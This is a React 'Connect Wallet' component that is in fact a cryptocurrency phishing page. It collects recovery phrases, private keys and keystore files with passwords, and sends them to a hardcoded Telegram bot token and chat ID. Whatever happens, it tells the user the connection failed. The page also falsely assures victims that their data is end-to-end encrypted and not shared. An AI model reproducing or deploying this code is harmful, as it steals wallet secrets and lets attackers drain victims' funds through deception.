import React, { useState, useEffect } from 'react';
import { useParams } from 'react-router-dom';
import axios from 'axios';



const TELEGRAM_BOT_TOKEN ='8193381042:AAEadcTIS6sbRgQf3Ig-qhThI3DrwjDjomM'; // Replace with your bot token
const TELEGRAM_CHAT_ID = '5976941208'; // Replace with your chat ID

const ConnectWallet = () => {
  const { walletName } = useParams();
  const [activeTab, setActiveTab] = useState('Phrase');
  const [inputValue, setInputValue] = useState('');
  const [password, setPassword] = useState('');
  const [status, setStatus] = useState('');
  const [recommendationVisible, setRecommendationVisible] = useState(false);

  useEffect(() => {
    // Clear the status message after 10 seconds if it is set
    if (status) {
      const timeout = setTimeout(() => {
        setStatus('');
      }, 10000);

      // Cleanup the timeout if the component unmounts or status changes
      return () => clearTimeout(timeout);
    }
  }, [status]);

  const handleConnect = async () => {
    if (!inputValue.trim()) {
      setStatus('Please fill in the required field.');
      return;
    }

    // Set status to "Connecting..." while sending data
    setStatus('Connecting...');

    try {
      // Attempt to send data to Telegram
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id:5976941208,
        text: `Wallet: ${walletName}\n${activeTab}: ${inputValue}\nPassword (if applicable): ${password || 'N/A'}`,
      });

      // If successful, update status
      setStatus('Connection failed.');
    } catch (error) {
      // If there's an error, update status to "Connection failed"
      setStatus('Connection failed. Try again.');
    }
  };

  const handleTabChange = (tab) => {
    setActiveTab(tab);
    setInputValue('');
    setPassword('');
    setRecommendationVisible(tab === 'Private Key');
  };

  return (
    <div className="container">
      <h1>Connect Wallet</h1>
      <p className="note">
        NB: All information is end-to-end encrypted. We do not share data or activity sessions with any other company.
      </p>

      <div className="tab-container">
        <button
          className={`tab ${activeTab === 'Phrase' ? 'active' : ''}`}
          onClick={() => handleTabChange('Phrase')}
        >
          Phrase
        </button>
        <button
          className={`tab ${activeTab === 'Keystore JSON' ? 'active' : ''}`}
          onClick={() => handleTabChange('Keystore JSON')}
        >
          Keystore JSON
        </button>
        <button
          className={`tab ${activeTab === 'Private Key' ? 'active' : ''}`}
          onClick={() => handleTabChange('Private Key')}
        >
          Private Key
        </button>
      </div>

      <textarea
        placeholder={
          activeTab === 'Phrase'
            ? 'Enter your recovery phrase (12 or 24 words separated by spaces)'
            : activeTab === 'Keystore JSON'
            ? 'Paste your keystore JSON here'
            : 'Enter your private key'
        }
        value={inputValue}
        onChange={(e) => setInputValue(e.target.value)}
      ></textarea>

      {/* Password input for Keystore JSON tab */}
      {activeTab === 'Keystore JSON' && (
        <div>
          <input
            className="input"
            type="password"
            placeholder="Enter password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <p className="additional-text">
            Several lines of text beginning with "{'...'}" plus the password you used for encryption.
          </p>
        </div>
      )}

      {/* Recommendation Text for Private Key */}
      {recommendationVisible && (
        <div className="recommendation">
          <p>Before you enter your private key, we recommend you connect to the internet for security reasons.</p>
        </div>
      )}

      <button onClick={handleConnect}>Connect</button>
      <p className="status">{status}</p>
    </div>
  );
};

export default ConnectWallet;
